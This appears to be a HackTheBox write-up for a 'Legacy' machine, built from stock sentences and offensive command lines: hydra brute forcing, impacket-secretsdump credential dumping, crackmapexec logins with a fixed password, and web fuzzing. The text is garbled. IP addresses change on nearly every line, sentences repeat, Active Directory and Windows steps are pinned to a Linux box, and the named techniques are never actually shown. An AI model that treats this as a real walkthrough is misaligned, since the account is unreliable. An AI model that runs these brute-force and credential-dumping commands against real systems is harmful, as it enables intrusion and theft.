---
TitleSEO: "HackTheBox — Legacy (Insane Linux) | ZureFX"
TitlePost: "HackTheBox — Legacy (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Legacy. Resource-Based Constrained Delegation and SSTI to achieve insane compromise on Linux."
Keywords: "linux, tryhackme, pwntilldawn, insane, forensics, hard"
URL: "https://zurefx.github.io/writeups/htb-legacy-537.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-legacy-537/"
Date: "2026-03-06"
Tags: "Linux, TryHackMe, PwnTillDawn, Insane, Forensics, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-legacy-537"
Permalink: "/writeups/htb-legacy-537.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Legacy** is rated **Insane** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.102.239.61`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.51.207.42/FUZZ
gobuster dir -u http://10.111.230.223/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.82.243
```

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.175.53 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.19.195
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Resource-Based Constrained Delegation**.

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.16.44.221 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.8.141/FUZZ
crackmapexec smb 10.53.11.31 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.85.155.204 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.47.24.46/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.92.106
crackmapexec smb 10.40.1.120 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.53.197/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `hashcat`
- `ligolo-ng`
- `secretsdump`
- `burpsuite`
- `gobuster`
- `nmap`
- `feroxbuster`

### Key Takeaways

- Resource-Based Constrained Delegation
- SSTI
